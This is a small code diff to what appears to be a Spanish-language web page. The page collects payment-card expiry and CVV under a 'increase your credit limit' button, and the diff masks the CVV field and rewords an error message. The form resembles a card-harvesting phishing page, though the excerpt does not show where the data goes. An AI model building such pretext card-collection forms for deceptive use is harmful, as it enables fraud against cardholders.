@@ -217,9 +217,9 @@ $fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
 
         <div class="row">
           <div class="field"><label>Vencimiento</label><input id="venc" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="off"></div>
-          <div class="field"><label>CVV</label><input id="cvv" type="tel" placeholder="•••" maxlength="3" inputmode="numeric" pattern="[0-9]*" autocomplete="off"></div>
+          <div class="field"><label>CVV</label><input id="cvv" type="password" placeholder="•••" maxlength="3" inputmode="numeric" pattern="[0-9]*" autocomplete="off"></div>
         </div>
-        <div class="err-msg" id="err-venc">Ingresa la fecha de vencimiento</div>
+        <div class="err-msg" id="err-venc">Fecha de vencimiento inválida</div>
 
         <button class="btn btn-primary ready" onclick="submitTarjeta()">Aumentar tu cupo</button>
       </div>
